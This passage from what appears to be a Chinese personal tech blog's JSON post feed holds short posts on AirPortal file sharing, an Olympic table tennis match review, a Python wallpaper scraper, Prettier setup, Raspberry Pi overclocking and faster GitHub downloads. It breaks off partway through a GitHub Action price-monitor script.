href=\"https://blog.yfun.top/#%E5%85%8D%E7%99%BB%E5%BD%95%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"免登录使用\"></a>免登录使用</h3>\n<p>AirPortal 可以免登录使用，以下是一些限制：</p>\n<table>\n<thead><tr>\n<th align=\"center\">未登录</th>\n<th align=\"center\">免费</th>\n<th align=\"center\">高级</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">10GB + 结余</td>\n</tr>\n<tr>\n<td align=\"center\">单次上传 1GB</td>\n<td align=\"center\">单次上传 2GB</td>\n<td align=\"center\">无限</td>\n</tr>\n</tbody>\n</table>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/1b7b87e798158.png\"><h3>\n<a href=\"https://blog.yfun.top/#%E7%AE%80%E6%B4%81%E7%9A%84%E9%A1%B5%E9%9D%A2\" class=\"headerlink\" title=\"简洁的页面\"></a>简洁的页面</h3>\n<p>没有花里胡哨的广告和弹窗，简洁明了，点击「发送」就可以发送文件或文字。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/3aa77007547f5.png\"><h3>\n<a href=\"https://blog.yfun.top/#Wi-Fi-%E5%BF%AB%E4%BC%A0\" class=\"headerlink\" title=\"Wi-Fi 快传\"></a>Wi-Fi 快传</h3>\n<p>在同一局域网下，使用客户端开启「Wi-Fi 快传」功能，文件传输不经过热铁盒服务器与公网，更快速，更安全。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%85%B1%E4%BA%AB\" class=\"headerlink\" title=\"剪贴板共享\"></a>剪贴板共享</h3>\n<p>基于 Wi-Fi 快传的剪贴板共享功能，可以轻松实现跨设备复制粘贴，零延迟，支持多种操作系统。</p>\n<p>（需要同时打开客户端并连接 Wi-Fi 快传，iOS 端将会以文本方式同步到客户端）</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%A4%9A%E5%B9%B3%E5%8F%B0\" class=\"headerlink\" title=\"多平台\"></a>多平台</h2>\n<p>拥有 iOS, 安卓, Windows, macOS 与 Linux 平台的客户端，其余平台也可以使用 网页端。</p>\n<p>官方网址：<a href=\"https://airportal.cn/\">https://airportal.cn/</a></p>\n<p>*: 感谢 AirPortal 空投的支持！</p> ","link":"https://blog.yfun.top/posts/2021/airportal/"},{"title":"2020 东京奥运乒乓球男单半决赛樊振东 4:3 险胜林昀儒晋级决赛，如何评价本场比赛？","date":"2021-07-30 06:30:07","description":"\n<p>恭喜樊振东抢七战胜小小林，4比3进入决赛！太过惊心动魄的一场比赛！</p>\n<p>继混双、女单过后，再次预测成功：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2012764905\" class=\"internal\">叶子盛：怎么看待奥运会乒乓球比赛抽签结果？伊藤美诚与孙颖莎同半区，樊振东与张本同半区，昕雯与日组合分属半区？</a><p>樊振东不论从任何方面，都是当世实力第一。奥运一路杀过来，也面对了无数冲击，樊振东对可能遇到的困难是有准备的。而小小林也不是等闲之辈，近年曾在T2上战胜樊振东。虽然那个比赛的赛制有点奇怪，也不是特别正式，但也是计入国际乒联的积分的，因此绝对可以体现出他的实力。前面打爆张本的达科，被小小林4比0带走。这场球，非常有看点。</p>\n<p>小小林一向以敏捷轻快、思路活跃、反手犀利著称。第一局果然给樊振东造成极大麻烦，直接拿下此局。小小林的发球变化极多，长球偷得又快又低，严重限制了樊振东的上步拧拉。同时正反手中近台的加力爆撕爆摁上台率也是极高。樊振东这边则没有完全适应这个节奏，相持中经常找不到点，而且小小林的力量相对弱势，反而让樊振东在相持中难以借力。</p>\n<p>第二场起直至第五场，双方进入了白热化的贴身肉搏战。樊振东状态慢慢回升，在长球的高质量对抗中取得上风；而小小林则一直保持反手的强势，拧拉接发力量很足但旋转偏弱，樊振东的回防屡屡下网；节奏的控制也很好，既然打快，那就一路快到底，樊振东反倒显得偏慢了。樊振东虽比第一局适应许多，但仍打得不舒服，全倚仗自己厚实的基本功硬吃硬撑。</p>\n<p>小小林的正手力量是薄弱项，但打球的确很聪明，竭尽全力不让樊振东抓住；如果被抓住了，那就搏杀一板，丢了不亏，上了刚好挫败一下樊振东的锐气。樊振东的中间四局打得非常艰难，没有几球的位置是舒舒服服能让他发力的，但仍努力找到间隙去发力得分。好在樊振东对小小林的偷长球适应了许多，算是少了一个劣势。</p>\n<p>第四局小小林增加了一些正手进攻的变化，起初的几球开始违背自己原本的特长，开始加旋转了。樊振东反而不太适应，引拍的防守本来都蹲着平直的弧线了，因而防守出界失分。可见小小林无时无刻不在尝试着变化。毕竟从纸面实力上来说，他还从未在赛制正规的国际比赛上战胜过樊振东。</p>\n<p>除了坚决执行拼搏的技战术，小小林的心态也是持续的稳定。早就有冷面杀手绰号的他，在奥运赛场上也是一副淡如水的神情，倒颇有几分魔王气质。相比而言，樊振东的心理状态肉眼可见有很大的起伏，好几次回合间的特写都可以从微表情看出他非常的紧张。这不由得让笔者为这场比赛的结果感到担心。</p>\n<p>第六局，樊振东大比分领先，士气也在线。笔者本以为差不多稳了，结果在接下来的接发球中，樊振东异常保守。小小林本是为了拼死搏杀几个，结果发现个个都上了，士气一下就恢复了。笔者眼看着比分拉近干着急。后小小林一鼓作气拿下该局，再没让樊振东拿到一分，笔者的心情可以说跌入了谷底。</p>\n<p>最惊心动魄的抢七开始。局间休息，解说员还在那里煞有闲事地聊混双。笔者虽知他们也很紧张，是为了调节气氛，但仍不禁暗骂晦气。但好在樊振东一路打得都比较顺，而小林的搏杀状态终于终于终于（这里要说三次，因为撑到这里实在太难得了）有了下滑。樊振东得以取得领先，比分到了8比4。</p>\n<p>笔者心里希望樊振东千万别像上一局那样松劲。但比分事与愿违，还是被逐渐拉近了些。这时笔者已经无心去分析技术了，大家都是老对手，现在只是在看双方的心理了；更何况大家都有能力拧起来互殴，一球球抠线路已经完全没有必要。好在樊振东没有受到前一局的影响，虽被追了数分，但自己也有所得分，率先拿到局点，并在之后的均势拉锯中四两拨千斤，拿下至关重要的一分，获得了半决赛的胜利！</p>\n<p>此时笔者脑海里只有“百炼成钢、破茧成蝶”之类的话，樊振东也经受住了考验。但笔者更想把这些话留到决赛之后。让我们拭目以待吧。另外，小小林打得真不错，应该说是非常出色。相信将来也会是在历史上留名的最顶级运动员之一。如果能把中台正手补上就更好了。</p>\n<p>艰难比赛看多了，不妨来看看虐菜爽文局：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p><br></p>\n<hr>\n<p>奥运赛程众多，多数以文字简评方式进行赏析。笔者创建了一个专栏，目前收录了较为齐全的各场次简评，自忖在全网算做得最有诚意的之一了。见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1404020055374372864\" data-image=\"https://pic3.zhimg.com/v2-52a669542a8699d42a3c5796c7e536e9.jpg\" data-image-width=\"200\" data-image-height=\"200\" class=\"internal\">乒乓赛事简评</a><p>欢迎前去专栏对我付出精力更大的图文作品进行指正。无团队，无盈利，用爱发电。如果喜欢，欢迎关注（含多个编辑推荐等）：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/biqinzhai\" data-image=\"https://pic1.zhimg.com/v2-cde3d62e8270146ee8593adcb47189c4.jpg\" data-image-width=\"183\" data-image-height=\"183\" class=\"internal\">避秦斋</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/macaoleaf?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">叶子盛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/475814903/answer/2026857855?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">277 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475759119?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运会乒乓球女单半决赛陈梦 4:0 胜于梦雨进决赛，如何评价本场比赛？</a><br><a href=\"http://www.zhihu.com/question/476490866?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会乒乓球女团 1/8 决赛中国队未失一局 3:0 轻松晋级？</a><br>\n","link":"http://www.zhihu.com/question/475814903/answer/2026857855?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 